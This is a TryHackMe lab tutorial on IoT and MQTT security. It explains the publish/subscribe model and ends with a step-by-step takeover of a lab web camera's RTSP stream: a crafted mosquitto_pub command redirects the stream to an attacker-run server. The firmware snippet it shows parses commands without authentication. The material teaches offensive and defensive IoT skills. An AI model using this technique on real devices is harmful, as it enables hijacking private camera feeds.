The Story

![Task banner for day 21](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/b6bf90fa41691cf902d80ca62eff81fd.png)  

After investigating the web camera implant through hardware and firmware reverse engineering, you are tasked with identifying and exploiting any known vulnerabilities in the web camera. Elf Mcskidy is confident you won't be able to compromise the web camera as it seems to be up-to-date, but we will investigate if off-the-shelf exploits are even needed to take back control of the workshop.

Check out Alh4zr3d's video walkthrough for Day 21 [here](https://www.youtube.com/watch?v=sqVKpAHZu9s)!  

Learning Objectives  

-   Explain the Internet of Things, why it is important, and if we should be concerned about their danger.
-   Understand the difference between an IoT-specific protocol and other network service protocols.
-   Understand what a publish/subscribe model is and how it interacts with IoT devices.
-   Analyze and exploit the behavior of a vulnerable IoT device.

What is the Internet of Things 

The **I**nternet **o**f **T**hings (**IoT**) defines a categorization of just that, “things”. Devices are interconnected and rely heavily on communication to achieve a device’s objectives. Examples of IoT include thermostats, web cameras, and smart fridges, to name only a few.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3db4fb129fb5cbfe9c34d9d092d6bf19.png)

While the formal definition of IoT may change depending on who is setting it, the term can best be used as a broad categorization of “a device that sends and receives data to communicate with other devices and systems.” 

If IoT defines such an extensive categorization of devices with varying capabilities and objectives, what makes them important or warrants that we study them? While several justifiable reasons exist to study IoT, we will address three possible answers.

First, IoT categorizes unique devices, e.g., smart fridges, that don't match other categories, such as mobile devices. IoT devices tend to be lightweight, which means that the device's functionality and features are limited to only essentials. Because of their lightweight nature, modern features may be left out or overlooked, one of the most concerning being security. While we live in a modern era of security, it may still be considered secondary, which is why it is not included in core functionality.

Second, devices are interconnected and often involve no human interaction. Think of authentication in which a human uses a password for security; these devices must not only be designed to communicate data effectively but also negotiate a secure means of communication such that human interaction is not required, e.g., using a password.

Third, devices are designed to all be interconnected, so if _device a_ is using _x protocol_ and _device b_ is using _y protocol_, it presents a significant problem in compatibility. The same concept can be applied to security where devices are incompatible but could fall back to insecure communication.

Remember, security is often thought of as secondary, so not ensuring a device can securely communicate with other devices may be a fatal weakness that is overlooked or deemed less important.

In the next section, we will cover how IoT protocols function and study examples of how devices may or may not address the flaws proposed above.

Introduction to IoT Protocols

An "IoT protocol" categorizes any protocol used by an IoT device for **machine-to-machine**, **machine-to-gateway**, or **machine-to-cloud** communication. As previously defined, an IoT device sends and receives data to communicate with other devices and systems; with this in mind, an IoT protocol's objective should be _efficient_, _reliable_, and _secure_ data communication.

We can break up IoT protocols into one of two types, an **IoT data protocol** or an **IoT network protocol**. These types may be deceiving in their name as both are used to communicate data. How they differentiate is how and where the communication occurs. At a glance, an IoT data protocol commonly relies on the **TCP/IP** (**T**ransmission **C**ontrol **P**rotocol/**I**nternet **P**rotocol) model, and an IoT network protocol relies on wireless technology for communication. We will continue expanding the purpose of these protocol types below.

Let's break down an IoT data protocol into concepts that may be more familiar to us. An IoT data protocol is akin to common network services you may use or interact with daily, such as HTTP, SMB, FTP, and others. In fact, HTTP can be used as the backbone for other IoT protocols or as an IoT data protocol itself.

An IoT network or wireless protocol still maintains the same goals as data protocols, that is, data communication, but it achieves it differently. Rather than relying on traditional TCP protocols, these protocols use wireless technology such as Wi-Fi, Bluetooth, ZigBee, and Z-Wave to transfer data and communicate between entities.

Throughout this task, we will focus on the former category of protocols and how they interact with IoT devices.

So then, let's dive deeper into IoT data protocols and what makes them… well, a data protocol.

Messaging Protocols and Middleware 

Because data communication is the primary objective of IoT data protocols, they commonly take the form of a **messaging protocol**; that is, the protocol facilities the **sending** and **receiving** of a **message** or **payload** between two parties.

Messaging protocols communicate between two devices through an independent server (”**middleware**”) or by negotiating a communication method amongst themselves.

Devices commonly use middleware because they must be lightweight and efficient; for example, an IoT device may not support a more robust protocol, such as HTTP. A server is placed in the middle of two clients who want to communicate to translate the communication method to a means both devices can understand, given their technology.

![Diagram of middleware translating data between client A and client B](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/495796497ee8356484689b008de96184.png)  

Recall how we mentioned that the combability of device protocols could be a problem; middleware fixes some of the associated issues but may still be unable to translate all communications.

Below is a brief synopsis of popular messaging protocols used by IoT devices.

**Protocol  
**

**Communication Method  
**

**Description**  

MQTT (Message Queuing Telemetry Transport)  

Middleware  

A lightweight protocol that relies on a publish/subscribe model to send or receive messages.  

CoAP (Constrained Application Protocol)  

Middleware  

Translates HTTP communication to a usable communication medium for lightweight devices.  

AMQP (Advanced Message Queuing Protocol)  

Middleware  

Acts as a transactional protocol to receive, queue, and store messages/payloads between devices.  

DDS (Data Distribution Service  

Middleware   

A scalable protocol that relies on a publish/subscribe model to send or receive messages.   

HTTP (Hypertext Transfer Protocol)  

Device-to-Device  

Used as a communication method from traditional devices to lightweight devices or for large data communication.  

WebSocket   

Device-to-Device  

Relies on a client-server model to send data over a TCP connection.  

We will continue diving deeper into the MQTT protocol and potentially related security issues throughout this task.

### Functionality of a Publish/Subscribe Model

Messaging protocols commonly use a **publish/subscribe model**, notably the **MQTT protocol**. The model relies on a broker to negotiate **"published" messages** and **"subscription" queries**. Let's first look at a diagram of this process and then break it down further.

![Diagram of a broker facilitating the communication between a publisher and subscriber](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/9af9a374b9401e1f61d200240752c012.png)  

Based on the above diagram,

1.  A publisher sends their message to a broker.
2.  The broker continues relaying the message until a new message is published.
3.  A subscriber can attempt to connect to a broker and receive a message.

The protocol should work fantastically if a single broker is needed for one device's objective, but what if several types of data need to be sent from one device or several publishers and subscribers need to connect to one broker? Using more than one broker can be feasible but increases unnecessary overhead and server usage.

A secure communication method should also ensure the integrity of messages, meaning one publisher should not overwrite another.

To address these problems, a broker can store multiple messages from different publishers by using **topics**. A topic is a semi-arbitrary value pre-negotiated by the publisher and subscriber and sent along with a message. The format of a topic commonly takes the form of `<name>/<id>/<function>`. When a new message is sent with a given topic, the broker will store or overwrite it under the topic and relay it to subscribers who have "subscribed" to it.

Below is a diagram showing two publishers sending different messages associated with topics.

![Diagram of multiple publishers sending messages with topics to a single broker](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/bc178e6c7cf7ad59bafa6029a4dc006e.png)  

Below is a diagram of several subscribers receiving messages from separate topics of a broker.

![Diagram of multiple subscribers requesting messages from several topics from a single broker](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/a8df1ae7f4eafc5aee7cec79e195c71d.png)  

Note the _asynchronous_ nature of this communication; the publisher can publish at any time, and the subscriber can subscribe to a topic to see if the broker relaid messages. Typically, subscribers and publishers will continue attempting to connect to the broker for a specific duration.

Well, we should now understand the functionality of this model, but why would an IoT device use it?

A publish/subscribe model is helpful for any data maintained asynchronously or received by several different devices from one publisher.

A common example of a publish/subscribe model could be a thermostat publishing its current temperature. Several thermostats can publish to one broker, and several devices can subscribe to the thermostat they want data from.

As a protocol specifically, MQTT is also lightweight, with a small footprint and minimal bandwidth.

### Are IoT Protocols Inherently Vulnerable?

We've identified the relation between IoT protocols and network services and how messaging protocols function. This still leaves the question of how secure IoT protocols are.

Let's apply this to something we are more familiar with, HTTP. "HTTP vulnerabilities" often refer to a vulnerability in the software/application built off the protocol; this does not mean protocols are absent of vulnerabilities, but they generally possess strict requirements and require revisions before release or public adoption.

Similarly, IoT protocols are not inherently vulnerable, so what makes an IoT device insecure?

Before giving a more formal explanation, let's consider the default settings of MQTT when it is first deployed. An MQTT broker assigns all devices connected to it read/write access to all topics; that is, any device can publish and subscribe to a topic. We may be okay with this idea at first; in the thermostat example, we are only communicating temperatures, so the integrity of the data should not be an issue. But let's dive into this issue more.

Our data should follow CIA (Confidentiality, Integrity, and Availability) best practices as closely as possible; that is, data should not be read or manipulated by unauthorized sources and should be accessible to authorized users. Following best practices, authentication and authorization should be implemented to prevent potentially bad actors from compromising any principle of the CIA triad.

What is the risk to IoT devices if best practices are not considered? Risk is almost solely dependent on the behavior of a device. Let's say a device trusts an MQTT publisher and parses data or commands to perform actions affecting the device's settings. An attacker could send a malicious message to perform unintended actions. For example, a thermostat sends a message with a specific format to a broker, and a subscriber parses the message and changes the temperature. An attacker could send their message outside of the intended application (e.g., a mobile app) to modify the device's temperature. Although this example may seem modest, imagine the impact this could have on other devices with consequences or critical devices, which are essential to the function of a society and/or economy.

To recap, an MQTT instance may be insecure due to improper data regulation best practices. An instance may be vulnerable if the device's behavior allows an attacker to perform malicious actions from expected interaction.

Note the differentiation between insecure and vulnerable; an insecure implementation may allow an attacker to exploit a vulnerability, but this does not mean the implementation is inherently vulnerable.

In the next task, we will expand this idea and attempt to identify methods we can use to identify the behavior of a given device.

### Abusing Device Behavior

Before moving on to the hands-on section, let's address how we can identify information about device behavior.

We've defined that IoT devices are vulnerable because of their applications' behavior. Now let's briefly look at how we can analyze a device's behavior for vulnerable entry points and how they can be abused.

An attacker can discover device behavior from communication sniffing, source code analysis, or documentation.

-   **Communication sniffing** can determine the protocol used, the middleware or broker address, and the communication behavior. For example, unencrypted HTTP requests are sent to a central server, which are then translated to CoAP packets. We can observe the HTTP packets and look for topics or message formats that vendors should hide, e.g. settings, commands, etc., to interact with the device.
-   **Source code analysis** can give you direct insight into how a device parses sent data and how it is being used. Analysis can identify similar information to communication sniffing but may act as a more reliable and definite source of information.
-   **Documentation** provides you with a clear understanding of the standard functionality of a device or endpoint. A disadvantage of only using documentation as a means of identification is that it may leave out sensitive payloads, topics, or other information that is not ordinarily relevant to an end user that we, as attackers want.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/86c6456b29440fe8c7318f6d28c6d99f.png)

Once a behavior is identified, we can use clients to interact with devices and send malicious messages/payloads.

To cement this concept, let's go back to the thermostat example and see how an attacker may attempt to control the device.   

Most IoT devices have a device ID that they use to identify themselves to other devices and that other devices can use to identify the target device. Devices must exchange this device ID before any other communication can occur. In the case of MQTT, a device ID is commonly exchanged by publishing a message containing the device ID to a pre-known topic that anyone can subscribe to.  

Once an attacker knows the device ID and behavior of a target device they can attempt to target specific topics or message formats. These topics may trust the message source and perform some action blindly (e.g. change a temperature, change a publishing destination, etc.)

In our scenario, preliminary information has been identified by Recon McRed through hardware analysis and firmware reverse engineering. The web camera device is known to use the MQTT protocol, and we have a list of potential topics we can target. Before analyzing these potentially vulnerable topics, let's look at how we may interact with an MQTT endpoint normally.   

Interacting with MQTT

How do we interact with MQTT or other IoT protocols? Different protocols will have different libraries or other means of interacting with them. For MQTT, there are two commonly used libraries we will discuss, that is, **Paho** and **Mosquitto**. Paho is a python library that offers support for all features of MQTT. Mosquitto is a suite of MQTT utilities that include a broker and publish/subscribe clients that we can use from the command line.

In this task, we will introduce the Mosquitto clients and their functionality; in the next task, we will leverage the clients against a vulnerable device to get hands-on.

****Subscribing to a Topic****

We can use the [mosquitto_sub](https://mosquitto.org/man/mosquitto_sub-1.html) client utility to subscribe to an MQTT broker.

By default, the subscription utility will connect a localhost broker and only require a topic to be defined using the `-t` or **`—topic`** flag. Below is an example of connecting to a localhost and subscribing to the topic, _device/ping_.

`mosquitto_sub -t device/ping`

You can also specify a remote broker using the `-h` flag. Below is an example of connecting to _example.thm_ and subscribing to the topic, _device/thm_.

`mosquitto_sub -h example.thm -t device/thm`

****Publishing to a Topic****

We can use the [mosquitto_pub](https://mosquitto.org/man/mosquitto_pub-1.html) client utility to publish to an MQTT broker.

To publish a message to a topic is nearly identical to that of the subscription client. This time, however, we need to include a `-m` or `—message` flag to denote our message/payload. Below is an example of publishing to the topic, _device/info_ on the host, _example.thm_ with the message, _"This is an example."_

`mosquitto_pub -h example.thm -t device/info -m "This is an example"`

For both clients, there are several notable optional flags that we will briefly mention,

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/fbce96757ec751ebe2893a9f4eef0322.png)

-   `-d`: Enables debug messages.
-   `-i` or `—id`: Specifies the id to identify the client to the server.
-   `-p` or `—port`: Specifies the port the broker is using. Defaults to port `1883`.
-   `-u` or `—username`: Used to specify the username for authentication.
-   `-P` or `—password`: Used to specify the password for authentication.
-   `—url`: Used to specify username, password, host, port, and topic in one URL.

A device using MQTT will craft messages as a means of communication authentically. As an attacker, we will attempt to portray our publishing source as a legitimate source in hopes that the other side will interact with the message as it would an authentic message to provide us with unintended behavior. 

### Practical Application

We have covered all of the information needed to successfully approach exploiting an insecure data communication implementation of an IoT device. Let’s try to take what we have learned and apply it to the unknown web camera identified in Santa’s Workshop.

First, let's start the Virtual Machine by pressing the Start Machine button at the top of this task. Please allow the machine at least 5 minutes to deploy before interacting with it. You may interact with the VM using the AttackBox or your VPN connection.

Note: The in-browser attack box has been appropriately configured for this task, and we highly recommend using it for the duration of this task. If you are using your personal virtual machine, we will address some specific configurations that you must do for the attack to work successfully.   

As briefly covered previously, we know the following:  

-   The device interacts with an MQTT broker to publish and subscribe to pre-defined topics.
-   The device broker is found at `MACHINE_IP`.
-   From firmware reverse engineering, we know that the device uses these two topics
    -   `device/init`
        -   Publishes the device ID of the current device
    -   `device/<id>/cmd`
        -   Subscribes to the device ID-specific topic to receive commands and settings.
-   The device is known to use **RTSP** (Real Time Streaming Protocol) for input streaming.
-   If an attacker can control where and how the RTSP stream is forwarded, they can redirect it to an RTSP server they control.
    -   The `device/<id>/cmd` topic can specify a behavior through a numeric CMD parameter and the ability to parse a key-value pair to be used to interact with the device.

We do not yet possess how the command topic behaves or the format it is expecting the message. It is up to you to craft a malicious message to target the command topic. If you are looking for a challenge, we have provided you with a small source code snippet extracted from the device firmware that you can use to gather communication behavior from. Otherwise, we have collected the information you need with the expected format and behavior of the device.

_Device source code snippet (click to read)_

```python
def subscribe(client: mqtt_client):
    def on_message(client, userdata, msg):
        payload = msg.payload.decode()
        topic = msg.topic
        print("Topic:", topic)
        print("Payload:", payload)
        print("Parsing payload...")
        payload = payload.replace("{", "")
        payload = payload.replace("}", "")
        payload = payload.split(",")
        CMD = 0
        URL = 1
        command_payload = payload[CMD]
        url_payload = payload[URL]
        print(command_payload)
        print(url_payload)
        target_cmd = "10"
        CMD_NAME = 0
        CMD_VALUE = 1
        URL_NAME = 0
        URL_VALUE = 1
        command_payload = command_payload.split(":")
        url_payload = url_payload.split(":", 1)
        if command_payload[CMD_NAME].lower() == "cmd":
            if command_payload[CMD_VALUE] == target_cmd:
                print("Command value match")
                if url_payload[URL_NAME].lower() == "url":
                    print("RTSPS URL match:", url_payload[URL_VALUE])
                    try:
                        f = open("../src/url.txt", "x")
                        f.write(url_payload[URL_VALUE])
                        f.close()
                    except:
                        f = open("../src/url.txt", "w")
                        f.write(url_payload[URL_VALUE])
                        f.close()
                        
                    subprocess.call("../deploy/update.sh")

    client.subscribe(topic)
    client.on_message = on_message 
``` 

_Web camera expected device behavior (click to read)_

-   The expected format of the message is `{”CMD”:value,”URL”:"value"}`
    -   Note the format for quotes must match exactly, and double quotes must wrap the entire message. You can also use triple quote formatting to wrap all values and parameters in quotes. 
-   The CMD value to overwrite/redirect the RTSP URL is `10`
-   The URL value should be the _eth0_ or _ens0_ interface address of the attacking machine hosting the RTSP server and an RTSP path of your choosing.
    -   `RTSP://xxx.xxx.xxx.xxx:8554/path`

To get you started, we have provided steps for exploitation set up below,

1.  Verify that `MACHINE_IP` is an MQTT endpoint and uses the expected port with _Nmap_.
2.  Use `mosquitto_sub` to subscribe to the `device/init` topic to enumerate the device and obtain the device ID.
3.  Start an RTSP server using [rtsp-simple-server](https://github.com/aler9/rtsp-simple-server)
    -   `docker run --rm -it --network=host aler9/rtsp-simple-server`
    -   Note the port number for _RTSP_; we will use this in the URL you send in your payload.
    -   If you are having issues receiving a connection and are confident that your formatting is correct, you can attempt to use a TCP listener - `sudo docker run --rm -it -e RTSP_PROTOCOLS=tcp -p 8554:8554 -p 1935:1935 -p 8888:8888 aler9/rtsp-simple-server`
4.  Use `mosquitto_pub` to publish your payload to the `device/<id>/cmd` topic.
    
    ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/f8718ce9f1f93a9fa01ce70eed9d0be0.png)
    
    -   Recall that your URL must use the attackbox IP address or respective interface address if you are using the VPN and be in the format of `rtsp://xxx.xxx.xxx.xxx:8554/path`
    -   If the message was correctly interpreted and the RTSP stream was redirected the server should show a successful connection and may output warnings from dropped packets.
    
5.  You can view what is being sent to the server by running VLC and opening the server path of the locally hosted RTSP server.
    -   `vlc rtsp://127.0.0.1:8554/path`
    -   If you are using Kali, you must download VLC from the _snap_ package manager to ensure the proper codecs are installed. 

If you see a stream in VLC, congratulations, you have verified a takeover of the web camera stream. If you did not see the stream and are confident you followed the steps correctly and have tried the suggested remediations, restart the machine and ensure you wait 5 minutes before interacting with it.

Note the stream may take up to one minute to begin forwarding due to packet loss.